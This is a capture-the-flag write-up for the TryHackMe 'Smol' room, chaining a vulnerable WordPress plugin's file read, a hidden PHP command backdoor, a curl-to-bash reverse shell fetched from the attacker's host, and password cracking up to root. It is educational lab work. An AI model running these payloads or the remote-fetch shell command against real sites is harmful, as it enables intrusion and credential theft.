# Smol

## Room Info

This room is a WordPress-focused attack chain. The key lesson is that outdated WordPress components and risky plugins can be chained into full compromise. It also highlights why third-party plugin code should be reviewed carefully, because a hidden backdoor can turn a normal plugin into direct command execution.

Practical note: on systems without a GPU (like TryHackMe AttackBox), `john` is often faster and more practical than `hashcat` for this kind of password cracking.

## Writeup

I started the machine, connected to the VPN, and verified connectivity with `ping MACHINE_IP`.

As usual, I ran:
`nmap -sV MACHINE_IP`

Screenshot:
![Screenshot 01](images/Smol/ss-01.png)

From the scan, HTTP and SSH were open. I first visited:
`http://MACHINE_IP`

Then I realized the target expects a hostname, so I added it in `/etc/hosts`:
`sudo nano /etc/hosts`

Screenshot:
![Screenshot 02](images/Smol/ss-02.png)

After saving, I opened:
`http://www.smol.thm/`

Screenshot:
![Screenshot 03](images/Smol/ss-03.png)

I browsed the pages and confirmed it was WordPress, so I switched to enumeration with WPScan. I generated a free API token from `https://wpscan.com/register/` and ran:
`wpscan --url www.smol.thm --api-token YOUR_API`

Screenshot:
![Screenshot 04](images/Smol/ss-04.png)

The important findings were:
- XML-RPC enabled at `http://www.smol.thm/xmlrpc.php`
- WordPress `6.7.1` (outdated/insecure in this lab context)
- Core vulnerabilities listed by WPScan, including:
`CVE-2025-58674` and `CVE-2025-58246`
- Vulnerable plugin `jsmol2wp` with known issues

At this stage I focused on the plugin path because it gave the most direct exploitation route.

I reviewed the WPScan advisory and tested the PoC against the target by replacing localhost with the room domain:
`http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php`

This gave me useful output.

Screenshot:
![Screenshot 05](images/Smol/ss-05.png)

After inspecting the response closely, I extracted database credentials.

Screenshot:
![Screenshot 06](images/Smol/ss-06.png)

I then tried those credentials on the WordPress login page (reachable from the site UI, including the sign-in prompt near the bottom of the post/reply section), and login worked.

Screenshot:
![Screenshot 07](images/Smol/ss-07.png)  
Screenshot:
![Screenshot 08](images/Smol/ss-08.png)

Inside the dashboard, I inspected available content and found a private page with internal notes.

Screenshot:
![Screenshot 09](images/Smol/ss-09.png)  
Screenshot:
![Screenshot 10](images/Smol/ss-10.png)

One useful lead was to inspect `hello.php` plugin source. Using the same vulnerable endpoint pattern, I requested:
`http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/hello.php`

I received encoded data.

Screenshot:
![Screenshot 11](images/Smol/ss-11.png)

After base64 decoding in CyberChef, I found obfuscated PHP that resolves to:
`if (isset($_GET["cmd"])) { system($_GET["cmd"]); }`

Screenshot:
![Screenshot 12](images/Smol/ss-12.png)  
Screenshot:
![Screenshot 13](images/Smol/ss-13.png)

That confirms a backdoor-style command execution path through a `cmd` GET parameter.

I tested command execution and confirmed the endpoint was reacting.

Screenshot:
![Screenshot 14](images/Smol/ss-14.png)

For stable shell access, I prepared a reverse shell script (`wow.sh`), hosted it locally, and used the web request to fetch and execute it.

Local server:
`python3 -m http.server 80`

Screenshot:
![Screenshot 15](images/Smol/ss-15.png)

Trigger URL pattern:
`http://www.smol.thm/wp-admin/profile.php?cmd=curl+http://YOUR_IP/wow.sh|bash`

Listener:
`nc -lvnp 1234`

Reverse shell landed successfully.

Screenshot:
![Screenshot 16](images/Smol/ss-16.png)

With shell access, I authenticated to MySQL using the recovered credentials:
`mysql -u wpuser -p`

Screenshot:
![Screenshot 17](images/Smol/ss-17.png)

I enumerated databases/tables and pulled WordPress user hash data from `wordpress -> wpusers`.

Helpful commands:
- `SHOW DATABASES;`
- `USE database_name;`
- `SHOW TABLES;`
- `DESCRIBE table_name;`

Screenshot:
![Screenshot 18](images/Smol/ss-18.png)

I saved the hashes into `wordpress.txt`, identified format as `phpass`, and cracked with John:
`john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt wordpress.txt`

This recovered Diego's password.

Screenshot:
![Screenshot 19](images/Smol/ss-19.png)

I switched user:
`su diego`

Screenshot:
![Screenshot 20](images/Smol/ss-20.png)

Then I moved to Diego's home and got `user.txt`.

Screenshot:
![Screenshot 21](images/Smol/ss-21.png)

Next objective was root/admin-level access. Diego was not enough (no sudo privileges), so I continued local enumeration under `/home` and checked user directories/permissions.

I found SSH material in `think`'s home.

Screenshot:
![Screenshot 22](images/Smol/ss-22.png)

I used it to log in:
`ssh think@MACHINE_IP -i id_rsa`

Screenshot:
![Screenshot 23](images/Smol/ss-23.png)

Then checked groups:
`groups`

`think` had useful group memberships (`dev`, `internal`).

Screenshot:
![Screenshot 24](images/Smol/ss-24.png)

I needed access to `wordpress.old.zip` under `/home/gege`, so I attempted lateral movement and tested account switching. Switching to `gege` worked without prompting for a password in this environment.

Screenshot:
![Screenshot 25](images/Smol/ss-25.png)

I tried unzipping `wordpress.old.zip`, but it required a password.

Screenshot:
![Screenshot 26](images/Smol/ss-26.png)

I continued enumeration and found `/opt/wp_backup.sql`.
The file was large, but it contained useful credential/hash data.

Screenshot:
![Screenshot 27](images/Smol/ss-27.png)

I extracted relevant hashes into `wordpress.txt` and cracked again with John:
`john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt wordpress.txt`

Eventually I got the required password.

Screenshot:
![Screenshot 28](images/Smol/ss-28.png)  
Screenshot:
![Screenshot 29](images/Smol/ss-29.png)

With that password, I unzipped the backup and reviewed `wp-config.php`, where I found credentials for user `xavi`.

Screenshot:
![Screenshot 30](images/Smol/ss-30.png)

I switched to `xavi` using the recovered password:
`su xavi`

Screenshot:
![Screenshot 31](images/Smol/ss-31.png)

Then I checked sudo rights and confirmed privileged access.

Screenshot:
![Screenshot 32](images/Smol/ss-32.png)

From there, I escalated to root and read the root flag:
- `sudo su`
- `cd /root`
- `cat root.txt`

Screenshot:
![Screenshot 33](images/Smol/ss-33.png)  
Screenshot:
![Screenshot 34](images/Smol/ss-34.png)

## Vulnerability Chain (Clean Summary)

- Outdated/vulnerable WordPress and plugin surface discovered via WPScan
- Plugin endpoint abuse allowed sensitive file read (`wp-config.php`)
- Reused credentials enabled WordPress login
- Backdoored plugin logic exposed command execution via GET `cmd`
- RCE gave shell access
- Database/user hash extraction enabled lateral movement
- Further credential recovery from backups enabled privilege escalation to root
